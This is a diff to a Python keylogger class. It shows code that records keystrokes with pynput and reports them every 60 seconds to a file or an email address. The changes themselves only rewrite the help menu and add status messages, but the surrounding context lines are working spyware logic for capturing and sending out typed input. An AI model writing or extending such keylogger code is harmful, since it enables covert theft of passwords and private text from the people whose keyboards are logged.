@@ -20,17 +20,22 @@ class Keylogger:
 
             for currentArgument, currentValue in arguments:
                 if currentArgument in ("-h", "--help"):
-                    print("Usage: python keylogger.py [-h or --help for help] [-f or --output-file file-name, for file to write output to] [-e or --email \"email address\", for email to send outputs to]")
+                    print("                 Keylogger           \n\n")
+                    print("-h or --help          -    print this menu")
+                    print("-f or --file [file]   -    to write keystrokes to a file")
+                    print("-e or --email [email] -    to send keystrokes to an email")
                     exit()
                     
                 elif currentArgument in ("-f", "--output-file"):
                     print("Writing output to file: %s" % currentValue)
+                    print("Press 'end' key to end.")
                     self.file1 = open(currentValue, "a")
                     self.choose_report_method = 0
                     self.timer = threading.Timer(60, self.report_file)  
 
                 elif currentArgument in ("-e", "--email"):
                     print("Sending emails to (every 60 seconds): " + currentValue)
+                    print("Press 'end' key to end.")
                     self.receiver = currentValue
                     self.choose_report_method = 1
                     self.timer = threading.Timer(60, self.report_mail)  
@@ -62,13 +67,13 @@ class Keylogger:
             if key == key.space:
                 self.log = self.log + " "
             self.log += str(key) + " "
-        print(self.log)
 
     def process_key_release(self, key):
         if key == pynput.keyboard.Key.end:
             # Stop listener and timer
             self.timer.cancel()
             self.file1.close()
+            print("\nKeylogger stopped.")
             exit()
 
     def start(self):
